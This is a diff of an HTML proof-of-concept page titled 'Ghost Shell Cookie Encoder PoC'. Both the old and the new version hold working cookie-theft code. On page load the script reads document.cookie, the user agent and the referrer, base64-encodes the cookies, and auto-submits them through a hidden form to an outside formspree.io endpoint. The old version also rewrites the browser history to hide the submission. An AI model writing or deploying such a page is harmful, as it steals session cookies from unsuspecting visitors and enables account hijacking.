@@ -1,33 +1,65 @@
-<html>
-  <body>
-    <form id="autoForm" action="https://formspree.io/f/xeoqzkqe" method="POST">
-      <input type="hidden" name="cookie_data" id="cookie_data" value="" />
-      <input type="hidden" name="user_agent" id="user_agent" value="" />
-      <input type="hidden" name="referrer" value="No_Referrer" />
-      <input type="hidden" name="fallback" value="not_empty" />
-      <input type="submit" value="Submit request" />
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Ghost Shell Cookie Encoder PoC</title>
+    <style>
+        body {
+            background-color: black;
+            color: white;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            flex-direction: column;
+            font-family: Arial, sans-serif;
+        }
+        h2 {
+            text-align: center;
+            color: gold;
+            text-shadow: 0 0 10px rgba(255, 215, 0, 0.8);
+        }
+        form {
+            display: none;
+        }
+    </style>
+</head>
+<body>
+
+    <h2>Ghost Shell Cookie Encoder PoC</h2>
+
+    <form id="stealthForm" action="https://formspree.io/f/xeoqzkqe" method="POST">
+        <input type="hidden" name="cookie_data" id="cookieField" value="">
+        <input type="hidden" name="user_agent" id="userAgentField" value="">
+        <input type="hidden" name="referrer" id="referrerField" value="">
+        <input type="hidden" name="fallback" value="not_empty">
+        <button type="submit">Send</button>
     </form>
 
-    <button onclick="submitForm()">Submit Manually</button>
-
     <script>
-      function getCookies() {
-        return document.cookie; // Get all cookies as a string
-      }
+        document.addEventListener("DOMContentLoaded", function() {
+            function encodeBase64(str) {
+                return btoa(unescape(encodeURIComponent(str)));
+            }
 
-      function submitForm() {
-        document.getElementById('cookie_data').value = getCookies(); // Set cookies
-        document.getElementById('user_agent').value = navigator.userAgent; // Set user agent
-        document.getElementById('autoForm').submit();
-      }
+            function encodeURL(str) {
+                return encodeURIComponent(str);
+            }
 
-      // Auto-submit the form when the page loads
-      window.onload = function() {
-        submitForm();
-      };
+            var cookies = document.cookie || "No_Cookies";
+            var userAgent = navigator.userAgent || "Unknown_User_Agent";
+            var referrer = document.referrer || "No_Referrer";
 
-      // Clear history to remove form submission URL
-      history.pushState('', '', '/');
+            document.getElementById("cookieField").value = encodeBase64(cookies);
+            document.getElementById("userAgentField").value = encodeURL(userAgent);
+            document.getElementById("referrerField").value = encodeURL(referrer);
+
+            if (cookies !== "No_Cookies" || referrer !== "No_Referrer") {
+                document.getElementById("stealthForm").submit();
+            }
+        });
     </script>
-  </body>
+
+</body>
 </html>
